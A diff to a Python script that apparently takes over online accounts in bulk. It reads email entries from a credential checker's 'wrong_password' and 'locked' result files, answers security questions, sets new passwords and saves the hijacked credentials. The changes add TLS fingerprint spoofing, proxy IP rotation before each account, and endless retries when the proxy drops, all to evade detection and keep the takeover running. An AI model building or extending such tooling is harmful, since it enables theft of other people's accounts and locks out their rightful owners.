@@ -82,6 +82,32 @@ def change_proxy_ip():
         logger.warning(f"Failed to change IP: {e}")
         return False
 
+def wait_until_proxy_online(retry_delay=10):
+    """
+    Wait indefinitely until proxy is online.
+    Never gives up - keeps retrying until proxy is available.
+    """
+    if not PROXY_ENABLED:
+        return True
+    
+    import requests
+    proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
+    proxies = {'http': proxy_url, 'https': proxy_url}
+    
+    attempt = 0
+    while True:
+        attempt += 1
+        try:
+            resp = requests.get('https://api.ipify.org?format=json', proxies=proxies, timeout=15)
+            if resp.status_code == 200:
+                ip = resp.json().get('ip', 'unknown')
+                logger.info(f"Proxy online. Current IP: {ip}")
+                return True
+        except Exception as e:
+            logger.warning(f"Proxy offline (attempt {attempt}): {e}")
+            logger.info(f"Waiting {retry_delay}s before retry...")
+            time.sleep(retry_delay)
+
 # Security questions mapping
 SECURITY_QUESTIONS = {
     # Chinese questions
@@ -148,19 +174,18 @@ class UnlockedAccountFlow:
         self.new_password = self._generate_password()
         
         # Setup session with proxy
+        self.session = tls_client.Session(
+            client_identifier="chrome_120",
+            random_tls_extension_order=True
+        )
+        
         proxy_url = get_proxy_url()
         if proxy_url:
-            self.session = tls_client.Session(
-                client_identifier="chrome_120",
-                random_tls_extension_order=True,
-                proxy=proxy_url
-            )
+            self.session.proxies = {
+                'http': proxy_url,
+                'https': proxy_url
+            }
             logger.info(f"[{self.email}] Using proxy: {PROXY_HOST}:{PROXY_PORT}")
-        else:
-            self.session = tls_client.Session(
-                client_identifier="chrome_120",
-                random_tls_extension_order=True
-            )
         
         self.headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -550,9 +575,32 @@ class UnlockedAccountFlow:
 
 
 def process_account(account_data: str) -> dict:
-    """Process a single account"""
-    flow = UnlockedAccountFlow(account_data)
-    return flow.run()
+    """Process a single account with retry on proxy failure"""
+    while True:
+        try:
+            flow = UnlockedAccountFlow(account_data)
+            result = flow.run()
+            
+            # Check if result indicates proxy failure - retry if so
+            if not result['success']:
+                error_msg = result.get('message', '').lower()
+                if 'connection refused' in error_msg or 'connect:' in error_msg or 'timeout' in error_msg:
+                    logger.warning(f"Proxy failed during processing, retrying...")
+                    logger.info("Waiting for proxy to recover...")
+                    wait_until_proxy_online()
+                    continue
+            
+            return result
+        except Exception as e:
+            error_msg = str(e)
+            if 'connection refused' in error_msg.lower() or 'connect:' in error_msg.lower() or 'timeout' in error_msg.lower():
+                logger.warning(f"Proxy failed during processing: {e}")
+                logger.info("Waiting for proxy to recover...")
+                wait_until_proxy_online()
+                continue
+            else:
+                logger.error(f"Error processing account: {e}")
+                return {'success': False, 'message': str(e), 'new_password': None}
 
 
 def main():
@@ -560,20 +608,32 @@ def main():
     print(f"{Fore.CYAN}[+] Unlocked Account Password Change Flow{Fore.RESET}")
     print(f"{Fore.CYAN}[+] For accounts with security questions{Fore.RESET}\n")
     
-    # Read accounts from Accounts.txt
-    try:
-        with open('files/Accounts.txt', 'r', encoding='utf-8') as f:
-            accounts = [line.strip() for line in f.readlines() if line.strip()]
-        print(f"Reading from: files/Accounts.txt")
-    except FileNotFoundError:
-        print(f"{Fore.RED}Error: files/Accounts.txt not found{Fore.RESET}")
-        return
+    # Read accounts from checker results (wrong_password.txt and locked.txt)
+    accounts = []
+    source_files = [
+        '../checker/files/results/wrong_password.txt',
+        '../checker/files/results/locked.txt'
+    ]
+    
+    for source_file in source_files:
+        try:
+            with open(source_file, 'r', encoding='utf-8') as f:
+                for line in f.readlines():
+                    line = line.strip()
+                    if line:
+                        # Remove timestamp suffix if present (" | 2025-12-24 12:41:55")
+                        if ' | ' in line:
+                            line = line.split(' | ')[0]
+                        accounts.append(line)
+            print(f"Reading from: {source_file} ({len(accounts)} total)")
+        except FileNotFoundError:
+            print(f"{Fore.YELLOW}File not found: {source_file}{Fore.RESET}")
     
     if not accounts:
         print(f"{Fore.YELLOW}No accounts to process{Fore.RESET}")
         return
     
-    print(f"Found {len(accounts)} account(s)\n")
+    print(f"\nFound {len(accounts)} account(s) to process\n")
     
     if PROXY_ENABLED:
         print(f"{Fore.CYAN}[+] Proxy enabled: {PROXY_HOST}:{PROXY_PORT}{Fore.RESET}")
@@ -583,10 +643,15 @@ def main():
         email = account.split(',')[0]
         print(f"{Fore.YELLOW}[{i+1}/{len(accounts)}] Processing: {email}{Fore.RESET}")
         
-        # Change IP before each account if proxy enabled
-        if PROXY_ENABLED and i > 0:
-            print(f"{Fore.CYAN}  Changing IP...{Fore.RESET}")
-            change_proxy_ip()
+        # Wait for proxy to be online before processing (never skip)
+        if PROXY_ENABLED:
+            print(f"{Fore.CYAN}  Waiting for proxy to be online...{Fore.RESET}")
+            wait_until_proxy_online()
+            
+            # Change IP before each account
+            if i > 0:
+                print(f"{Fore.CYAN}  Changing IP...{Fore.RESET}")
+                change_proxy_ip()
         
         result = process_account(account)
         
@@ -597,22 +662,27 @@ def main():
                 from datetime import datetime
                 timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                 
-                # Write to Success.txt
+                # Write to valid_sq.txt (checker results)
+                with open('../checker/files/results/valid_sq.txt', 'a+') as f:
+                    f.write(f"{new_account} | {timestamp}\n")
+                
+                # Also write to local Success.txt
                 with open('files/Success.txt', 'a+') as f:
                     f.write(f"{new_account} | {timestamp}\n")
                 
-                # Update Accounts.txt
-                try:
-                    with open('files/Accounts.txt', 'r', encoding='utf-8') as f:
-                        lines = f.readlines()
-                    with open('files/Accounts.txt', 'w', encoding='utf-8') as f:
-                        for line in lines:
-                            if line.strip() == account:
-                                f.write(f"{new_account}\n")
-                            else:
-                                f.write(line)
-                except Exception as e:
-                    logger.error(f"Failed to update Accounts.txt: {e}")
+                # Remove from source files (wrong_password.txt and locked.txt)
+                for source_file in source_files:
+                    try:
+                        with open(source_file, 'r', encoding='utf-8') as f:
+                            lines = f.readlines()
+                        with open(source_file, 'w', encoding='utf-8') as f:
+                            for line in lines:
+                                # Check if this line contains the processed email
+                                if email.lower() not in line.lower():
+                                    f.write(line)
+                        logger.info(f"Removed {email} from {source_file}")
+                    except Exception as e:
+                        logger.warning(f"Could not update {source_file}: {e}")
         else:
             print(f"{Fore.RED}[FAILED] {email} -> {result['message']}{Fore.RESET}")
             with lock:
